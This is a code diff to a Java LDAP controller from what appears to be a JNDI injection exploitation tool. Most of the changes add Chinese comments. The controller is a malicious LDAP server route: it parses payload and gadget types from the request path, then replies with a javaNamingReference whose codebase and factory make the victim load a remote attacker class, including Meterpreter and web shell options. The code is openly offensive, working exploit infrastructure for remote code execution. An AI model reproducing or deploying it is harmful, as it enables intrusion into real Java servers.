@@ -39,6 +39,9 @@ import static com.nu1r.jndi.gadgets.utils.HexUtils.generatePassword;
 import static com.nu1r.jndi.gadgets.utils.InjShell.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
+/**
+ * 本地工厂类加载路由
+ */
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
     //最后的反斜杠不能少
@@ -48,6 +51,12 @@ public class BasicController implements LdapController {
     private        GadgetType  gadgetType;
     public static  CommandLine cmdLine;
 
+    /**
+     发送LDAP资源引用结果和基本远程参考负载。
+     @param result InMemoryInterceptedSearchResult类型，拦截的查询结果。
+     @param base String类型，基本的LDAP路径。
+     @throws Exception
+     */
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
@@ -57,6 +66,7 @@ public class BasicController implements LdapController {
             CtClass   ctClass;
             ClassPool pool;
 
+            // 根据不同的负载类型，设置className并处理
             switch (payloadType) {
                 case nu1r:
                     CommandTemplate commandTemplate = new CommandTemplate(params[0]);
@@ -265,15 +275,19 @@ public class BasicController implements LdapController {
                     break;
             }
 
+            // 从给定的代码库路径和类名创建URL
             URL turl = new URL(new URL(this.codebase), className + ".class");
             System.out.println(ansi().render("@|green [+]|@ Send LDAP reference result for " + base + " redirecting to" + turl));
+            // 创建一个新的条目并添加属性
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaCodeBase", this.codebase);
             e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            // 如果className是Meterpreter，则添加javaFactory属性为“Meterpreter”，否则为className
             if (className.equals("com.feihong.ldap.template.Meterpreter")) {
                 e.addAttribute("javaFactory", "Meterpreter");
             }
             e.addAttribute("javaFactory", className);
+            // 发送搜索条目并设置结果代码为成功
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
@@ -283,10 +297,12 @@ public class BasicController implements LdapController {
 
     }
 
-    public static void main(String[] args) {
-        System.out.println(ansi().fgRgb(188, 232, 105).render(" Windows下使用Agent写入"));
-    }
-
+    /**
+     处理传入的参数 base
+     @param base 传入的参数
+     @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
+     @throws IncorrectParamsException 错误的参数异常
+     */
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
         try {
@@ -295,22 +311,28 @@ public class BasicController implements LdapController {
             if (secondIndex < 0) secondIndex = base.length();
 
             try {
+                // 将类型值设为从第一个斜杠后的字符串到第二个斜杠前（不包括第二个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                 payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                 System.out.println(ansi().render("@|green [+]|@PaylaodType >> " + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
 
+            // 获取第三个斜杠的索引
             int thirdIndex = base.indexOf("/", secondIndex + 1);
+            // 如果第三个斜杠为空，则执行以下语句块
             if (thirdIndex != -1) {
+                // 如果第三个斜杠小于0，则将其设置为字符串长度
                 if (thirdIndex < 0) thirdIndex = base.length();
                 try {
+                    // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 GadgetType 枚举类型
                     gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                 } catch (IllegalArgumentException e) {
                     throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                 }
             }
 
+            // 如果载荷类型为 shell，则执行以下语句块
             if (gadgetType == GadgetType.shell) {
                 String   arg     = Util.getCmdFromBase(base);
                 String[] args    = arg.split(" ");
